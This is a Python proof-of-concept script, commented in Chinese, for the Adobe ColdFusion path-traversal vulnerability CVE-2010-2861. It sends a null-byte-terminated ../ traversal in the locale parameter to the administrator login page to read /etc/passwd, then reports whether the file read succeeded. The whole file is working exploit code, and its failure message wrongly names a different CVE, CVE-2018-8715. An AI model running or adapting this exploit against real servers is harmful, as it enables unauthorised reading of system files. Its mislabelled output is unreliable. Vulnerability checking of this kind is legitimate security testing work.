"""
Adobe ColdFusion 文件读取(CVE-2010-2861)POC
判断是否存在文件读取POC
helop
python3 CVE-2010-2861.py url(http://192.168.0.11:8080/)
"""
import sys
import requests
import re


def use_poc(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    }
    url = url + "?locale=../../../../../../../../../../etc/passwd%00en"
    # params = params
    resp = requests.get(url, headers=headers)
    osb = re.compile(r'<p style="font-weight:bold;margin:5px 0px 5px 0px;">(?P<pasd>.*?)</p>', re.S)
    z = osb.search(resp.text)
    z = z.group("pasd")

    if ":" in z:
        print("存在文件读取漏洞")
    else:
        print("Sorry , No CVE-2018-8715!")


if __name__ == '__main__':
    print("python3 CVE-2010-2861.py http://192.168.0.11:8080/")
    url = sys.argv[1] + "CFIDE/administrator/enter.cfm"
    use_poc(url)